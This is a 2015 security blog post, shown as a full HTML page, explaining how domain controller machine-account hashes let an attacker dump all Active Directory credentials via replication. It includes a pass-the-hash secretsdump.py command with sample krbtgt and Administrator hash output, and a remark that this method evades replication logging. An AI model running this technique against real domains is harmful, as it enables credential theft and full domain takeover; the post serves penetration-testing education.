<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>Using Domain Controller Account Passwords To HashDump Domains &middot; Rob &#39;mubix&#39; Fuller</title>
        <meta name="description" content="Since I follow both Carlos Perez and Benjamin Delpy on Twitter, something caught my eye on August 2nd, soon after Benjamin Delpy drops DCSync:
@Carlos_Perez haha, if yes, it will be a 0d ;)
No, like always it needs some rights ;) DA is cool, maybe DC$ is enough
&mdash; ü•ù Benjamin Delpy (@gentilkiwi) August 2, 2015  And then later on August 28th, again about the DC$ account (Domain Controller computer account):">
        <meta name="HandheldFriendly" content="True">
        <meta name="MobileOptimized" content="320">
        <meta name="generator" content="Hugo 0.20.7" />
        <meta name="robots" content="index,follow">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <link rel="stylesheet" href="https://room362.com/css/normalize.css">
        <link rel="stylesheet" href="https://room362.com/css/highlight.css">
        <link rel="stylesheet" href="https://room362.com/css/style.css">
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300&subset=latin,cyrillic-ext,latin-ext,cyrillic">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    </head>
    <body>
        
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-198967-1', 'auto');
ga('send', 'pageview');
</script>


        <div id="wrapper">
            <header class="site-header">
                <div class="container">
                    <div class="site-title-wrapper">
                        
                            <h1 class="site-title">
                                <a title="Room362" href="https://room362.com/">Room362</a>
                            </h1>
                        
                        <a class="button-square" href="https://room362.com/index.xml"><i class="fa fa-rss"></i></a>
                        
                            <a class="button-square button-social hint--top" data-hint="Twitter" title="Twitter" href="https://twitter.com/mubix">
                                <i class="fa fa-twitter"></i>
                            </a>
                        
                        
                        
                            <a class="button-square button-social hint--top" data-hint="Github" title="Github" href="https://github.com/mubix">
                                <i class="fa fa-github-alt"></i>
                            </a>
                        
                        
                        
                            <a class="button-square button-social hint--top" data-hint="LinkedIn" title="LinkedIn" href="https://linkedin.com/in/mubix">
                                <i class="fa fa-linkedin"></i>
                            </a>
                        
                        
                            <a class="button-square button-social hint--top" data-hint="Google+" title="Google+" href="https://google.com/&#43;mubix">
                                <i class="fa fa-google-plus"></i>
                            </a>
                        
                    </div>

                    <ul class="site-nav">
                        
    <li class="site-nav-item">
        <a title="Brandon" href="/brandon/">Brandon</a>
    </li>

    <li class="site-nav-item">
        <a title="About Me" href="/about/">About Me</a>
    </li>

    <li class="site-nav-item">
        <a title="Start in Infosec" href="/start/">Start in Infosec</a>
    </li>

    <li class="site-nav-item">
        <a title="Projects" href="/projects/">Projects</a>
    </li>

    <li class="site-nav-item">
        <a title="PwnWiki" href="http://pwnwiki.io">PwnWiki</a>
    </li>

                    </ul>
                </div>
            </header>

            <div id="container">


<div class="container">
    <article class="post-container" itemscope="" itemtype="http://schema.org/BlogPosting">
        <header class="post-header">
    <h1 class="post-title" itemprop="name headline">Using Domain Controller Account Passwords To HashDump Domains</h1>
    
    <p class="post-date">
        <span>Published <time datetime="2015-09-15" itemprop="datePublished">Tue, Sep 15, 2015</time></span>
        <span>by</span>
        <span itemscope="" itemprop="author" itemtype="https://schema.org/Person">
            <span itemprop="name">
                <a href="https://twitter.com/mubix" itemprop="url" rel="author">Rob &#39;mubix&#39; Fuller</a>
            </span>
        </span>
    </p>
</header>

        <div class="post-content clearfix" itemprop="articleBody">
    

    <p>Since I follow both <a href="https://twitter.com/carlos_perez">Carlos Perez</a> and <a href="https://twitter.com/gentilkiwi">Benjamin Delpy</a> on Twitter, something caught my eye on August 2nd, soon after <a href="https://twitter.com/gentilkiwi">Benjamin Delpy</a> drops <a href="https://twitter.com/gentilkiwi/status/627977943923490816">DCSync</a>:</p>

<blockquote class="twitter-tweet"><p lang="en" dir="ltr"><a href="https://twitter.com/Carlos_Perez">@Carlos_Perez</a> haha, if yes, it will be a 0d ;)<br>No, like always it needs some rights ;) DA is cool, maybe DC$ is enough</p>&mdash; ü•ù Benjamin Delpy (@gentilkiwi) <a href="https://twitter.com/gentilkiwi/status/627980725074153473">August 2, 2015</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

<p>And then later on August 28th, again about the DC$ account (Domain Controller computer account):</p>

<blockquote class="twitter-tweet"><p lang="en" dir="ltr"><a href="https://twitter.com/hashtag/mimikatz?src=hash">#mimikatz</a> DCSync make logs with &#39;Directory Service Access&#39; DS-Replication-Get-Changes*<br>Except if you use a DC account <a href="http://t.co/QAChOGU3z7">pic.twitter.com/QAChOGU3z7</a></p>&mdash; ü•ù Benjamin Delpy (@gentilkiwi) <a href="https://twitter.com/gentilkiwi/status/637402457740562432">August 28, 2015</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

<p>Because DCSync is calling on &ldquo;sync&rdquo; based APIs of Active Directory, that are, by default, used only by Domain Controllers, all Domain Controller computer accounts would have the ability to do this as well as the Domain/Enterprise Admins.</p>

<p>Anyone who&rsquo;s ever administered an Active Directory, knows that computer accounts change their passwords automatically. How often do they change them?</p>

<p><a href="https://support.microsoft.com/en-us/kb/154501:">https://support.microsoft.com/en-us/kb/154501:</a></p>

<blockquote>
<p>&ldquo;Machine account passwords are regularly changed for security purposes. By default, on Windows NT-based computers, the machine account password automatically changes every <strong>seven days</strong>. Starting with Windows 2000-based computers, the machine account password automatically changes every <strong>30 days</strong>.&rdquo;</p>
</blockquote>

<p>PSSSST!! That article is about how to <strong>DISABLE</strong> automatic password changing</p>

<p><img src="/images/2015/activedirectory_muhaha.jpg" alt="" /></p>

<p>Alright. So, I&rsquo;m not going to go into &ldquo;how&rdquo; to get the hashes for a computer account, but if you&rsquo;ve ever dumped passwords before, the computer accounts are the ones with the &ldquo;$&rdquo; on the end. Find the ones that are domain controllers, match up the hashes, and use <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py">Impacket&rsquo;s secretsdump.py</a> to your heart&rsquo;s content. (Or until the password changes for that DC, then you use another one to dump it again, oh, did I not mention that computers don&rsquo;t change their passwords all at the same time in that 30 day window?)</p>

<p>Remember, Domain Controller&rsquo;s don&rsquo;t have a lot of other permissions, so you need to use the &ldquo;<code>-just-dc</code>&rdquo; option in SecretsDump in order for it to just do the domain dump:</p>

<pre><code>python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc LAB/DC2k8_1\$@172.16.102.15

Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</code></pre>

<p>Happy #HackersDay</p>

</div>

        <footer class="post-footer clearfix">
    
        <p class="post-tags">
            <span>Tagged:</span>
            
                 <a href="/tags/domain-controllers/">domain controllers</a>
            
                 <a href="/tags/dcsync/">dcsync</a>
            
                 <a href="/tags/hashdump/">hashdump</a>
            
                 <a href="/tags/passwords/">passwords</a>
            
                 <a href="/tags/mimikatz/">mimikatz</a>
            
        </p>
    

    <div class="share">
        <a class="icon-twitter" href="https://twitter.com/share?text=Using%20Domain%20Controller%20Account%20Passwords%20To%20HashDump%20Domains&url=https%3a%2f%2froom362.com%2fpost%2f2015%2fusing-domain-controller-account-passwords-to-hashdump-domains%2f"
            onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
            <i class="fa fa-twitter"></i>
            <span class="hidden">Twitter</span>
        </a>

        <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2froom362.com%2fpost%2f2015%2fusing-domain-controller-account-passwords-to-hashdump-domains%2f"
            onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
            <i class="fa fa-facebook"></i>
            <span class="hidden">Facebook</span>
        </a>

        <a class="icon-google-plus" href="https://plus.google.com/share?url=https%3a%2f%2froom362.com%2fpost%2f2015%2fusing-domain-controller-account-passwords-to-hashdump-domains%2f"
           onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
           <i class="fa fa-google-plus"></i>
            <span class="hidden">Google+</span>
        </a>
    </div>
</footer>

        
    </article>
</div>

            </div>
        </div>

        <footer class="footer">
            <div class="container">
                <div class="site-title-wrapper">
                    <h1 class="site-title">
                        <a title="Room362" href="https://room362.com/">Room362</a>
                    </h1>
                    <a class="button-square button-jump-top js-jump-top" href="#">
                        <i class="fa fa-angle-up"></i>
                    </a>
                </div>

                <p class="footer-copyright">
                    <span>&copy; 2017 / Powered by <a href="https://gohugo.io/">Hugo</a></span>
                </p>
                <p class="footer-copyright">
                    <span><a href="https://github.com/roryg/ghostwriter">Ghostwriter theme</a> By <a href="http://jollygoodthemes.com">JollyGoodThemes</a></span>
                    <span>/ <a href="https://github.com/jbub/ghostwriter">Ported</a> to Hugo By <a href="https://github.com/jbub">jbub</a></span>
                </p>
            </div>
        </footer>

        <script src="https://room362.com/js/jquery-1.11.3.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js"></script>
        <script src="https://room362.com/js/jquery.fitvids.js"></script>
        <script src="https://room362.com/js/scripts.js"></script>
    </body>
</html>

